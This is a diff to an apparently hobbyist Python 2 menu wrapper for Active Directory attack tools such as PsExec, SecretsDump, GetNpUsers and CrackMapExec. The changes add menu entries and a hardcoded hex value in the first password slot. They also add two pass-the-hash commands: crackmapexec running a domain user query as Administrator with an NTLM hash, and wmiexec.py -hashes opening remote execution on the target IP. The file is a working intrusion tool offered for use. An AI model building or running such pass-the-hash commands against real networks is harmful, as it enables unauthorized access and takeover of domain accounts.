@@ -254,16 +254,16 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) BLANK     (30) IfMap          (40) RpcClient      (50) BLANK  (60) FTP          " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) BLANK     (31) OpDump         (41) GetGt          (51) BLANK  (61) SSH          " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) BLANK     (32) LookupSid      (42) GetSt          (52) BLANK  (62) TelNet       " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Ping REMOTE IP     (23) NetView   (33) SamrDump       (43) GetUsersPns    (53) BLANK  (63) NetCat       " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Get Architecture   (24) Services  (34) RpcDump        (44) GetAdUsers     (54) BLANK  (64) WinRemote    " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) AtExec    (35) Reg            (45) KerbCheckUsers (55) BLANK  (65) BLANK        " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + SKEW    (26) DcomExec  (36) SmbClient      (46) GetNpUsers     (56) BLANK  (66) BLANK        " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap SUBDOMAINS    (27) PsExec    (37) SmbMap SHARE   (47) SecretsDump    (57) BLANK  (67) BLANK        " + u'\u2551'
-   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) SmbExec   (38) SmbMount SHARE (48) WinDapSearch   (58) BLANK  (68) BLANK        " + u'\u2551'
-   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) WmiExec   (39) Enum4Linux     (49) LdapDomainDump (59) BLANK  (69) BLANK        " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) BLANK     (30) IfMap          (40) RpcClient      (50) ACLPWN       (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) BLANK     (31) OpDump         (41) GetGt          (51) SecretsDump  (61) SSH    " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) BLANK     (32) LookupSid      (42) GetSt          (52) CrackMapExec (62) TelNet " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Ping REMOTE IP     (23) NetView   (33) SamrDump       (43) GetUsersPns    (53) WmiExec HASH (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Get Architecture   (24) Services  (34) RpcDump        (44) GetAdUsers     (54) BLANK        (64) WinRem " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) AtExec    (35) Reg            (45) KerbCheckUsers (55) BLANK        (65) BLANK  " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + SKEW    (26) DcomExec  (36) SmbClient      (46) GetNpUsers     (56) BLANK        (66) BLANK  " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap SUBDOMAINS    (27) PsExec    (37) SmbMap SHARE   (47) SecretsDump    (57) BLANK        (67) BLANK  " + u'\u2551'
+   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) SmbExec   (38) SmbMount SHARE (48) WinDapSearch   (58) BLANK        (68) BLANK  " + u'\u2551'
+   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) WmiExec   (39) Enum4Linux     (49) LdapDomainDump (59) BLANK        (69) BLANK  " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
 
 # -------------------------------------------------------------------------------------
@@ -343,7 +343,7 @@ X2   = " "*COL4
 US   = []
 PA   = []
 US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 30 USERNAMES
-PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 30 PASSWORDS
+PA   = ["32693b11e6aa90eb43d32c72a07ceea6",X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 30 PASSWORDS
 
 
 # -------------------------------------------------------------------------------------
@@ -912,6 +912,8 @@ while True:
 
       raw_input("\nPress ENTER to continue...")
 
+      print SH0 # DEBUG
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -994,8 +996,9 @@ while True:
          US[x] = US[x].split(",")
          US[x] = US[x][0]
          US[x] = padding(US[x], COL3)
-         PA[x] = "................................"
-         if US[x] != ""*COL3:
+         if PA[x] == "                                ":
+            PA[x]  = "................................";
+         if US[x] != "":
             os.system("echo " + US[x] + " >> users.txt")
       
       if US[12] != "":
@@ -1158,8 +1161,9 @@ while True:
          US[x] = US[x].split("@")
          US[x] = US[x][0]
          US[x] = padding(US[x], COL3)
-         PA[x] = "................................"
-         if US[x] != ""*COL3:
+         if PA[x] == "                                ":
+            PA[x]  = "................................";
+         if US[x] != "":
             os.system("echo " + US[x] + " >> users.txt")
       
       if US[12] != "":
@@ -1244,12 +1248,13 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - TEMP PA[0] = needs more refining!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      exit(1)       
+      CMD = "crackmapexec smb " + TIP.rstrip(" ") + " -u Administrator -H 000:" + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec"
+      command(CMD)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1260,7 +1265,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      exit(1)       
+      CMD = PRO + "wmiexec.py -hashes :" + PA[0] + " administrator@" + TIP.rstrip(" ")
+      command(CMD)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
